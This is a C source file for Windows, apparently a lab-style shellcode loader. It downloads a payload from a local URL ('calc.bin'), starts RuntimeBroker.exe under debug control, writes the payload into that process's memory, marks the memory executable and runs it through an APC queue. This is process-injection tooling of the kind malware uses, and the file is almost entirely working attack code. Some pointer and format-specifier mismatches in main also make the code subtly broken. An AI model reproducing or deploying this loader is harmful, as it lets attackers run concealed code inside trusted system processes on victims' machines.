#include<stdio.h>
#include<windows.h>
#include<wininet.h>
#pragma warning(disable : 4996)

BOOL GetFromUrl(LPCWSTR szUrl, PBYTE* pCodeBytes, SIZE_T* sCodeSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL, hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL, pTmpBytes = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pCodeBytes = pBytes;
	*sCodeSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}


BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Instead of CREATE_SUSPENDED
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL executeProgram(HANDLE hProcess, HANDLE hThread, PBYTE pProgram, SIZE_T sSizeOfProgram) {

	PVOID	pAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	// Allocate memory in the remote process of size sSizeOfProgram
	pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfProgram, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pAddress);



	// Write the Program in the allocated memory
	if (!WriteProcessMemory(hProcess, pAddress, pProgram, sSizeOfProgram, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfProgram) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	memset(pProgram, '\0', sSizeOfProgram);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pAddress, sSizeOfProgram, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	printf("[i] Executing Code ... ");
	// Launch the Program in a new thread
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}

int main() {
	LPCWSTR szUrl = L"http://127.0.0.1:8000/calc.bin";
	PBYTE pCodeBytes = NULL;
	SIZE_T sCodeSize = 0;
	LPCSTR lpProcessName = "Runtimebroker.exe";
	DWORD* dwProcessId = NULL;
	HANDLE* hProcess = NULL;
	HANDLE* hThread = NULL;


	if (GetFromUrl(szUrl, &pCodeBytes, &sCodeSize)) {
		// Process the Code as needed
		


		if (!CreateSuspendedProcess(lpProcessName, &dwProcessId, &hProcess, &hThread))
		{
			printf("Error in CreateSuspendedProcess\n ");
		}
		printf("[+] Target process created with Pid: %d\n", dwProcessId);

		if (!executeProgram(hProcess, hThread, pCodeBytes, sCodeSize))
		{
			printf("Error in RunViaApcInjection\n ");
		}
		
		//stop the debugger
		DebugActiveProcessStop(dwProcessId);


		
		// Free allocated memory
		if (pCodeBytes != NULL) {
			LocalFree(pCodeBytes);
		}

		return 0; // Indicate successful execution
	}
	else {
		// Handle error
		printf("[!] Failed to retrieve Code from %ls\n", szUrl);
		return 1; // Indicate failure
	}
}